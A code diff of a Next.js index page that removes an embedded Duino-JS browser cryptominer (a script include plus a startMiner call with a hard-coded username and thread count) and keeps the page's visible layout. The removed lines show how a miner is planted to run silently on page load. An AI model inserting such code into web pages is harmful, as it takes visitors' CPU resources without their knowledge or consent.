@@ -15,16 +15,7 @@ import Head from "next/head";
 
 export default function IndexPage() {
   return (
-    <><Head>
-      <script type="text/javascript" src="/static/duino-js.min.js"></script>
-    </Head>
-      <script>
-        const username = `ipigtw`; // Put your username here (e.g. revox, ericddm, snehaislove or Hoiboy19), the default is Hoiboy19.
-        const rigid = `Duino-JS`; // If you want to change the rig ID, you can change this. If you want to keep using "Duino-JS", you can remove this line.
-        const threads = userThreads; // Set the amount of threads to use here, check out https://github.com/sys-256/Duino-JS#Options for more options. The default is 1.
-        const miningkey = null; // Put your mining key here. If you haven't set one, replace "test" with null
-        startMiner(username, rigid, threads, miningkey); // Starts the miner
-      </script>
+    
       <BackgroundImage
         src="/mygo.jpg"
         style={{ minHeight: "100vh", display: "flex", alignItems: "center" }}
@@ -78,6 +69,6 @@ export default function IndexPage() {
             </Button>
           </Card>
         </Group>
-      </BackgroundImage></>
+      </BackgroundImage>
   );
 }
